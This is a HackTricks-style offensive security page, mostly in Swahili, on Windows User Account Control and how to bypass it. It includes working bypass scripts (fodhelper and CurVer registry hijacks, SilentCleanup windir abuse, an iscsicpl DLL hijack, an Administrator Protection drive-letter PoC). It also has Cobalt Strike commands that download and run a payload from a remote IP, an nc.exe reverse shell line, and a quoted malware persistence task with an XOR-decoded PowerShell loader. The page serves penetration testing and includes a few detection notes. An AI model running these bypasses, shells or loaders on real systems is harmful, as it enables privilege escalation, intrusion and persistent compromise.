# UAC - Udhibiti wa Akaunti za Mtumiaji

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni feature inayowezesha **consent prompt kwa shughuli zinazohitaji elevation**. Applications zina viwango tofauti vya `integrity`, na program yenye **high level** inaweza kutekeleza tasks ambazo **zinaweza kuhatarisha mfumo**. UAC inapowezeshwa, applications na tasks huendeshwa kila wakati **chini ya security context ya akaunti isiyo ya administrator**, isipokuwa administrator aidhinishe wazi applications/tasks hizo kupata access ya kiwango cha administrator kwenye mfumo ili ziendeshwe. Ni feature ya convenience inayowalinda administrators dhidi ya mabadiliko yasiyokusudiwa, lakini haichukuliwi kuwa security boundary.<sup>[[2]](#references)</sup>

Kwa maelezo zaidi kuhusu integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC inapokuwa inatumika, mtumiaji wa administrator hupewa tokens 2: standard user token, kwa ajili ya kutekeleza vitendo vya kawaida katika medium integrity, na token nyingine yenye admin privileges.

[Ukurasa huu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) unaeleza kwa kina jinsi UAC inavyofanya kazi na unajumuisha logon process, user experience, na UAC architecture.<sup>[[2]](#references)</sup> Administrators wanaweza kutumia security policies kusanidi jinsi UAC inavyofanya kazi kwa ajili ya organization yao katika kiwango cha local (kwa kutumia secpol.msc), au kusanidi na kusambaza mipangilio hiyo kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali imejadiliwa kwa kina [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna Group Policy settings 10 zinazoweza kuwekwa kwa ajili ya UAC. Jedwali lifuatalo linatoa maelezo ya ziada:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode kwa akaunti ya Administrator iliyojengwa ndani](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Tabia ya elevation prompt kwa administrators katika Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Tabia ya elevation prompt kwa standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Kugundua application installations na kuomba elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Kuwa-elevate executables zilizosainiwa na kuthibitishwa pekee](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Kuwa-elevate UIAccess applications zilizowekwa katika secure locations pekee](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Kuendesha administrators wote katika Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Kuruhusu UIAccess applications kuomba elevation bila kutumia secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Kubadilisha kwenda secure desktop wakati wa kuomba elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Ku-virtualize file na registry write failures kwenda kwenye locations za kila mtumiaji](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies za kusakinisha software kwenye Windows

**local security policies** ("secpol.msc" kwenye mifumo mingi) zimesanidiwa kwa default ili **kuzuia non-admin users kusakinisha software**. Hii inamaanisha kwamba hata kama non-admin user anaweza kudownload installer ya software yako, hataweza kuiendesha bila akaunti ya admin.

### Registry Keys za kulazimisha UAC kuomba Elevation

Ukiwa standard user asiye na admin rights, unaweza kuhakikisha akaunti ya "standard" **inaombwa credentials na UAC** inapojaribu kutekeleza actions fulani. Action hii inahitaji kubadilisha **registry keys** fulani, ambazo zinahitaji admin permissions, isipokuwa kuwe na **UAC bypass**, au attacker awe tayari amelogin akiwa admin.

Hata kama user yuko katika group ya **Administrators**, mabadiliko haya humlazimisha user **kuingiza tena credentials za akaunti yake** ili kutekeleza administrative actions.

**Kwa vitendo, hii ni muhimu tu ikiwa tayari una elevated token, UAC bypass, au misconfiguration inayokuruhusu kubadilisha keys hizi; vinginevyo registry write yenyewe huzuiwa.**

Registry keys na entries unazopaswa kubadilisha ni zifuatazo (zikiwa na default values kwenye mabano):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Hili pia linaweza kufanywa manually kupitia Local Security Policy tool. Baada ya kubadilishwa, administrative operations humtaka user aingize tena credentials zake.

### Kumbuka

**User Account Control si security boundary.** Kwa hiyo, standard users hawawezi kutoka kwenye akaunti zao na kupata administrator rights bila local privilege escalation exploit.

### Kumwomba user 'full computer access'
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode hutumia ukaguzi wa integrity kuzuia michakato yenye kiwango cha juu cha integrity (kama vivinjari vya wavuti) kufikia data yenye kiwango cha chini cha integrity (kama folda ya temporary Internet files). Hili hufanywa kwa kuendesha kivinjari kwa low-integrity token. Kivinjari kinapojaribu kufikia data iliyohifadhiwa katika low-integrity zone, mfumo wa uendeshaji hukagua kiwango cha integrity cha mchakato na kuruhusu ufikiaji ipasavyo. Kipengele hiki husaidia kuzuia mashambulizi ya remote code execution kupata ufikiaji wa data nyeti kwenye mfumo.
- Mtumiaji anapoingia kwenye Windows, mfumo huunda access token yenye orodha ya privileges za mtumiaji. Privileges hufafanuliwa kama mchanganyiko wa rights na capabilities za mtumiaji. Token pia huwa na orodha ya credentials za mtumiaji, ambazo hutumika kumthibitisha mtumiaji kwenye kompyuta na kwenye rasilimali za mtandao.

### Autoadminlogon

Ili kusanidi Windows iingize kiotomatiki mtumiaji mahususi wakati wa kuwasha, weka **`AutoAdminLogon` registry key**. Hii ni muhimu kwa mazingira ya kiosk au kwa madhumuni ya testing. Tumia hii kwenye mifumo salama pekee, kwa kuwa inaweka password wazi kwenye registry.

Weka keys zifuatazo kwa kutumia Registry Editor au `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Ili kurejesha tabia ya kawaida ya kuingia, weka `AutoAdminLogon` kuwa 0.

## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una graphical access kwa victim, UAC bypass ni rahisi sana kwa sababu unaweza kubofya tu "Yes" kidokezo cha UAC kinapoonekana

UAC bypass inahitajika katika hali ifuatayo: **UAC imewashwa, process yako inaendeshwa katika medium integrity context, na user wako ni wa administrators group**.

Ni muhimu kutaja kwamba **ni vigumu zaidi kufanya UAC bypass ikiwa iko kwenye kiwango cha juu zaidi cha usalama (Always) kuliko ikiwa iko kwenye kiwango kingine chochote (Default).**

### Fast triage kutoka medium-integrity shell

Kabla ya kujaribu bypass, thibitisha kuwa uko katika hali sahihi na linganisha build ya host na methods zinazojulikana kufanya kazi:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Maelezo ya kiutendaji:
- Ikiwa `EnableLUA=0`, huhitaji bypass: token yoyote ya admin inaweza kuomba high integrity moja kwa moja.
- `ConsentPromptBehaviorAdmin=2` au `5` ndiyo hali ya kawaida kwa auto-elevate / COM-based bypasses.
- `Always Notify` huongeza kiwango cha ulinzi, lakini bado unapaswa kujaribu build halisi badala ya kudhani kuwa itashindwa: UACME bado inafuatilia baadhi ya mbinu zinazoendana na `AlwaysNotify` kwenye Windows builds za kisasa.<sup>[[3]](#references)</sup>

### UAC imezimwa

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`), unaweza **ku-execute reverse shell yenye admin privileges** (high integrity level) ukitumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Msingi Sana** UAC "bypass" (ufikiaji kamili wa mfumo wa faili)

Ikiwa una shell yenye user aliye ndani ya group la Administrators unaweza **mount C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) locally kwenye disk mpya na utakuwa na **access ya kila kitu ndani ya mfumo wa faili** (hata folder ya nyumbani ya Administrator).

> [!WARNING]
> **Inaonekana trick hii haifanyi kazi tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with Cobalt Strike

The Cobalt Strike techniques zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu zaidi cha usalama
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina modules kadhaa za **bypass** ya **UAC**.

### Miingiliano ya COM yenye elevation (`ICMLuaUtil` / `CMSTPLUA`)

Vitu vya COM vinavyoji-elevate kiotomatiki bado ni sehemu ya UAC inayotumika kwenye builds za kisasa. `ICMLuaUtil` bado inafuatiliwa na UACME kama inayofanya kazi kwenye branches za sasa za Windows, na offensive tooling inaendelea kurekebisha `CMSTPLUA` kwa kuchanganya process ya interactive desktop, execution ya 64-bit, na wakati mwingine PEB/process masquerading kabla ya kuita COM Elevation Moniker.<sup>[[3]](#references)</sup>

Vidokezo vya kiutendaji:
- Pendelea process ya **64-bit** katika **interactive session** ya mtumiaji (mara nyingi `explorer.exe` au child wake).
- Ikiwa raw shell itashindwa, jaribu tena kutoka kwa BOF / UACME implementation badala ya wrapper rahisi ya `CreateProcess`.
- Tarajia child execution kufanyika katika **process tofauti yenye elevation**; BOF nyingi hazi-elevate beacon ya sasa in-place.

### KRBUACBypass

Documentation na tool zinapatikana kwenye [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) ni mkusanyiko wa mbinu za UAC bypass. Icompile kwa Visual Studio au MSBuild; build huunda executables kadhaa (kwa mfano, `Source\Akagi\output\x64\Debug\Akagi.exe`), kwa hiyo chagua method inayofaa build ya target.<sup>[[3]](#references)</sup>\
Kuwa mwangalifu: baadhi ya bypass huanzisha programs zinazoonekana au prompts zinazoweza kumtahadharisha mtumiaji.<sup>[[3]](#references)</sup>

UACME ina **build version ambayo kila technique ilianza kufanya kazi**.<sup>[[3]](#references)</sup> Unaweza kutafuta technique inayoathiri versions zako:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, ukitumia ukurasa [huu](https://en.wikipedia.org/wiki/Windows_10_version_history), unapata Windows release `1607` kutoka kwenye build versions.

Workflow ya vitendo ni kwanza **kutathmini build ya host**, kisha kutumia method inayolingana:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` hulinganisha kwa haraka build ya ndani na mbinu zake za UAC zinazojulikana, jambo linalosaidia kuondoa haraka PoC ambazo hazifanyi kazi.<sup>[[4]](#references)</sup>
- `UACME` bado ndiyo katalogi bora ya umma ya kuoanisha bypass na build mahususi. Matoleo ya hivi karibuni yaliongeza mbinu mpya na kujaribu tena zilizopo dhidi ya **Windows 11 25H2**, kwa hivyo kagua tena README/maelezo ya matoleo kabla ya kudhani kuwa chapisho la zamani la blogu bado linatumika bila mabadiliko.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary inayoaminika `fodhelper.exe` hujiendesha kwa viwango vya juu kiotomatiki kwenye Windows za kisasa. Inapozinduliwa, huuliza njia ya registry ya kila mtumiaji iliyo hapa chini bila kuthibitisha verb ya `DelegateExecute`. Kuweka command hapo humruhusu mchakato wa Medium Integrity (mtumiaji yuko katika Administrators) kuanzisha mchakato wa High Integrity bila ombi la UAC.

Njia ya registry inayoulizwa na fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Hatua za PowerShell (weka payload yako, kisha trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Maelezo:
- Hufanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni default/lenient (si Always Notify yenye vizuizi vya ziada).
- Tumia njia ya `sysnative` kuanzisha PowerShell ya biti 64 kutoka kwenye process ya biti 32 kwenye Windows ya biti 64.
- Payload inaweza kuwa command yoyote (PowerShell, cmd, au njia ya EXE). Epuka UIs zinazoomba mwingiliano kwa ajili ya stealth.

#### CurVer/extension hijack variant (HKCU pekee)

Recent samples zinazotumia vibaya `fodhelper.exe` huepuka `DelegateExecute` na badala yake **huelekeza upya ProgID ya `ms-settings`** kupitia value ya `CurVer` ya kila mtumiaji. Binary inayopata auto-elevated bado hutafuta handler chini ya `HKCU`, kwa hiyo admin token haihitajiki kuweka keys:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Baada ya kupata privileges zilizoinuliwa, malware kwa kawaida **huzima prompts za baadaye** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya defense evasion ya ziada (kwa mfano, `Add-MpPreference -ExclusionPath C:\ProgramData`) na kuunda upya persistence ili iendeshe kwa high integrity. Kazi ya kawaida ya persistence huhifadhi **PowerShell script iliyosimbwa kwa XOR** kwenye diski na kuifungua na kuiendesha in-memory kila saa:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Toleo hili bado husafisha dropper na kuacha staged payloads pekee, hivyo detection hutegemea kufuatilia **`CurVer` hijack**, tampering ya `ConsentPromptBehaviorAdmin`, uundaji wa Defender exclusion, au scheduled tasks zinazodecrypt PowerShell ndani ya memory.<sup>[[5]](#references)</sup>

### UAC bypass kupitia task ya `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` huzindua `cleanmgr.exe` ikiwa na privileges za juu zaidi na kupanua `%windir%` kutoka kwenye mazingira ya mtumiaji. Ukidhibiti `HKCU\Environment\windir`, unaweza kuelekeza upanuzi huo kwenye command ya kiholela na kupata integrity ya juu bila dialog ya uthibitishaji.<sup>[[8]](#references)</sup> Njia hii bado inafaa kujaribiwa kwenye builds za hivi karibuni kwa sababu UACME inaendelea kuiweka technique hii ikiwa active, na ufuatiliaji wa issues za hivi karibuni unaonyesha kuwa Windows 11 24H2 huenda ikahitaji tu marekebisho madogo ya quoting.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
If task inaandika path kwenye build hiyo, jaribu tena ukitumia payload inayoishia kwa alama ya kunukuu (kwa mfano `cmd.exe"`). Daima safisha `HKCU\Environment\windir` baada ya testing.

#### More UAC bypass

UAC bypass nyingi za kawaida zinazotumia vibaya UI flows, COM objects, au desktop interaction huhitaji **full interactive session** na victim; shell ya kawaida ya `nc.exe` au service inayoendesha katika **Session 0** mara nyingi haitoshi.

Mara nyingi unaweza kutatua hili kwa kutumia session ya **meterpreter**. Hamia kwenye **process** yenye thamani ya **Session** iliyo sawa na **1**:

![Elekeza ms-settings kwenye custom extension (.thm) na uunganishe extension hiyo na payload yetu - More UAC bypass: Unaweza kufanya hivyo kwa kutumia meterpreter session. Hamia kwenye process yenye Session...](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass with GUI

Ikiwa una ufikiaji wa **GUI, unaweza tu kukubali UAC prompt** inapoonekana; huhitaji bypass ya kiufundi. Kwa hiyo, kupata GUI session mara nyingi kunatosha kuondoa kikwazo cha kiutendaji kinachoongezwa na UAC.

Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa akiitumia (huenda kupitia RDP), kuna **baadhi ya tools zitakazokuwa zinaendesha kama administrator**, ambapo unaweza **ku-run** **cmd**, kwa mfano **kama admin**, moja kwa moja bila kuulizwa tena na UAC, kama ilivyo kwenye [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa na **stealth** zaidi.

### Noisy brute-force UAC bypass

Ikiwa noise inakubalika, tool kama [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) inaweza kuomba elevation mara kwa mara hadi user aikubali.

### Your own bypass - Basic UAC bypass methodology

Ukiangalia **UACME**, utaona kwamba **UAC bypass** nyingi hutumia vibaya DLL hijacking (mara nyingi kwa kufanya binary iliyoinuliwa ipakie DLL inayodhibitiwa na attacker kutoka kwenye path inayoweza kuandikwa). [Soma hii ili ujifunze jinsi ya kupata vulnerability ya DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary itakayofanya **autoelevate** (hakikisha kwamba inapo-execute inaendesha katika high integrity level).
2. Kwa kutumia procmon, tafuta events za "**NAME NOT FOUND**" ambazo zinaweza kuwa vulnerable kwa **DLL Hijacking**.
3. Huenda ukahitaji **kuandika** DLL ndani ya baadhi ya **protected paths** (kama C:\Windows\System32) ambako huna permissions za kuandika. Unaweza kupita kizuizi hiki kwa kutumia:
1. **wusa.exe**: Windows 7,8 na 8.1. Inakuruhusu kutoa content ya CAB file ndani ya protected paths (kwa sababu tool hii ina-execute kutoka kwenye high integrity level).
2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kunakili DLL yako ndani ya protected path na ku-execute binary iliyo vulnerable na autoelevated.

### Another UAC bypass technique

Inahusisha kuangalia ikiwa **autoElevated binary** inajaribu **kusoma** kutoka kwenye **registry** **name/path** ya **binary** au **command** itakayokuwa **executed** (hii inavutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

`C:\Windows\SysWOW64\iscsicpl.exe` ya 32-bit ni binary ya **auto-elevated** ambayo inaweza kutumiwa vibaya kupakia `iscsiexe.dll` kwa kutumia search order. Ikiwa unaweza kuweka `iscsiexe.dll` hasidi ndani ya folder inayoweza kuandikwa na **user**, kisha ubadilishe `PATH` ya user wa sasa (kwa mfano kupitia `HKCU\Environment\Path`) ili folder hiyo itafutwe, Windows inaweza kupakia attacker DLL ndani ya process iliyoinuliwa ya `iscsicpl.exe` **bila kuonyesha UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Practical notes:
- Hii ni muhimu wakati user wa sasa yuko kwenye **Administrators** lakini anaendesha kwa **Medium Integrity** kutokana na UAC.
- Copy ya **SysWOW64** ndiyo inayohusika na bypass hii. Ichukulie copy ya **System32** kama binary tofauti na uthibitishe tabia yake kwa kujitegemea.
- Primitive hii ni mchanganyiko wa **auto-elevation** na **DLL search-order hijacking**, kwa hiyo ProcMon workflow ileile inayotumika kwa UAC bypass nyingine ni muhimu kuthibitisha DLL load inayokosekana.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Mawazo ya utambuzi:
- Toa alerti kwenye `reg add` / registry writes kwenda `HKCU\Environment\Path` yanayofuatwa mara moja na utekelezaji wa `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tafuta `iscsiexe.dll` katika maeneo **yanayodhibitiwa na mtumiaji** kama `%TEMP%` au `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Linganisha uzinduzi wa `iscsicpl.exe` na child processes zisizotarajiwa au upakiaji wa DLL kutoka nje ya Windows directories za kawaida.

### Utafiti mpya unaostahili kuchunguzwa kando

Baadhi ya chains za baada ya 2024 hazionekani tena kama registry hijacks za kawaida za `HKCU\Software\Classes`. Kwa mfano, activation-context cache poisoning inaweza kuunganisha **drive remap** na **DLL redirection** ili kupanda kutoka medium hadi high integrity kupitia trusted UI / auto-elevated binaries kama `ctfmon.exe` na targets za baadaye kama `fodhelper.exe`. Badala ya kurudia PoC kubwa hapa, angalia compact payload examples katika:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack kupitia per-logon-session DOS device map

Kwa RAiLaunchAdminProcess / UIAccess attack surface yote kwenye Windows 11 25H2, angalia ukurasa maalum:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” hutumia shadow-admin tokens zilizo na per-session `\Sessions\0\DosDevices/<LUID>` maps. Directory huundwa kwa ulegevu na `SeGetTokenDeviceMap` wakati wa resolution ya kwanza ya `\??`. Ikiwa attacker anamimpersonate shadow-admin token kwenye **SecurityIdentification** pekee, directory huundwa huku attacker akiwa **owner** (inarithi `CREATOR OWNER`), na hivyo kuruhusu drive-letter links zinazotangulia `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Hatua:**

1. Kutoka kwenye low-privileged session, ita `RAiProcessRunOnce` ili kuzindua shadow-admin `runonce.exe` isiyoonyesha prompt.
2. Duplicate primary token yake kuwa **identification** token na kui-impersonate huku ukifungua `\??` ili kulazimisha kuundwa kwa `\Sessions\0\DosDevices/<LUID>` ikiwa chini ya umiliki wa attacker.
3. Unda symlink ya `C:` hapo inayoelekeza kwenye attacker-controlled storage; filesystem accesses zinazofuata katika session hiyo zita-resolve `C:` kwenda kwenye attacker path, na kuwezesha DLL/file hijack bila prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jinsi User Account Control inavyofanya kazi](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Mkusanyiko wa mbinu za UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kichanganuzi cha uoanifu na launcher ya UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Yatumia AI Kuzalisha PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Unyonyaji wa 0-Day Dhidi ya Malengo ya Serikali za Kusini-Mashariki mwa Asia](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Kupita Ulinzi wa Wasimamizi wa Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – KUpita UAC kwa Kutumia Kazi ya SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
{{#include ../../banners/hacktricks-training.md}}
